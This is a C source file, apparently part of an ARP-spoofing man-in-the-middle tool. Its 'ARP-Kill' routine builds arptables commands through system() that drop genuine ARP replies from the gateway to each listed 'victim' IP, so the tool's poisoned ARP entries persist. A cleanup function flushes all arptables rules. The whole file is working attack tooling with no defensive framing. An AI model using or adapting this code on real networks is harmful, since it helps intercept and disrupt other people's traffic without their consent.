#include "utils_firewall.h"
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>

int setup_arp_block(unsigned char *gateway_mac, struct Victim *victims, int victim_count) {
    if (!gateway_mac || !victims || victim_count <= 0) return -1;

    char gw_mac_str[18];
    sprintf(gw_mac_str, "%02x:%02x:%02x:%02x:%02x:%02x",
            gateway_mac[0], gateway_mac[1], gateway_mac[2],
            gateway_mac[3], gateway_mac[4], gateway_mac[5]);

    printf("[FIREWALL] Engaging ARP-Kill strategy (arptables)...\n");

    for (int i = 0; i < victim_count; i++) {
        char victim_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, victims[i].ip, victim_ip, INET_ADDRSTRLEN);

        char cmd[1024];
        // Rule 1: Drop ARP packets from Gateway to Victim (Input and Forward chains)
        // We use --source-mac for the router and --destination-ip for the victim.
        snprintf(cmd, sizeof(cmd), 
                 "{ arptables -A INPUT --source-mac %s --destination-ip %s -j DROP 2>/dev/null && "
                 "  arptables -A FORWARD --source-mac %s --destination-ip %s -j DROP 2>/dev/null; } || "
                 "{ /sbin/arptables -A INPUT --source-mac %s --destination-ip %s -j DROP 2>/dev/null && "
                 "  /sbin/arptables -A FORWARD --source-mac %s --destination-ip %s -j DROP 2>/dev/null; } || "
                 "{ /usr/sbin/arptables -A INPUT --source-mac %s --destination-ip %s -j DROP 2>/dev/null && "
                 "  /usr/sbin/arptables -A FORWARD --source-mac %s --destination-ip %s -j DROP 2>/dev/null; }",
                 gw_mac_str, victim_ip, gw_mac_str, victim_ip,
                 gw_mac_str, victim_ip, gw_mac_str, victim_ip,
                 gw_mac_str, victim_ip, gw_mac_str, victim_ip);
        
        if (system(cmd) != 0) {
            fprintf(stderr, "[!] Warning: Failed to apply arptables rule for victim %s. Proceeding with active poisoning only.\n", victim_ip);
        } else {
            printf("[+] Blocking legitimate ARP from %s to %s.\n", gw_mac_str, victim_ip);
        }
    }

    return 0;
}

int cleanup_arp_block(void) {
    printf("[FIREWALL] Flushing arptables rules...\n");
    // We flush all rules to be safe, assuming the user isn't running other arptables rules.
    // If they were, we should ideally track rule numbers, but a flush is standard for these tools.
    system("arptables -F 2>/dev/null || /sbin/arptables -F 2>/dev/null || /usr/sbin/arptables -F");
    return 0;
}
